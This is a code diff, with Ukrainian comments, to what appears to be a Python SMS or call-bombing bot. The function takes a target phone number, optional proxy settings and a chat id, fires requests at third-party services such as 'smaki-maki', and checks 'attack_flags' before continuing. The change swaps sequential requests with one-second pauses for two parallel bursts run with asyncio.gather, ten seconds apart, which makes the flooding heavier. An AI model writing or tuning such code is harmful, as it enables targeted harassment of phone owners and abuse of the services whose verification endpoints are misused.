@@ -1434,20 +1434,35 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     else:
         logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
     
-    # Об'єднуємо: smaki-maki перший, потім всі перші запити, потім всі другі, потім smaki-maki другий
-    if smaki_first and smaki_second:
-        tasks = [smaki_first] + first_requests + second_requests + [smaki_second]
-    else:
-        tasks = first_requests + second_requests
+    # Формуємо першу пачку (всі перші запити)
+    first_batch = first_requests.copy()
+    if smaki_first:
+        first_batch.insert(0, smaki_first)
+    
+    # Формуємо другу пачку (всі другі запити)
+    second_batch = second_requests.copy()
+    if smaki_second:
+        second_batch.append(smaki_second)
 
     if not attack_flags.get(chat_id):
         return
-        
-    for task in tasks:
-        if not attack_flags.get(chat_id):
-            return
-        await task
-        await asyncio.sleep(1.0)  # Затримка 1 секунда між запитами
+    
+    # Виконуємо першу пачку паралельно
+    if first_batch:
+        logging.info(f"Запускаю першу пачку ({len(first_batch)} запитів)")
+        await asyncio.gather(*first_batch, return_exceptions=True)
+        logging.info("Перша пачка завершена")
+    
+    # Чекаємо 10 секунд перед другою пачкою
+    if second_batch:
+        logging.info("Чекаю 10 секунд перед другою пачкою...")
+        await asyncio.sleep(10.0)
+    
+    # Виконуємо другу пачку паралельно
+    if second_batch:
+        logging.info(f"Запускаю другу пачку ({len(second_batch)} запитів)")
+        await asyncio.gather(*second_batch, return_exceptions=True)
+        logging.info("Друга пачка завершена")
 
 async def start_attack(number, chat_id):
     global attack_flags
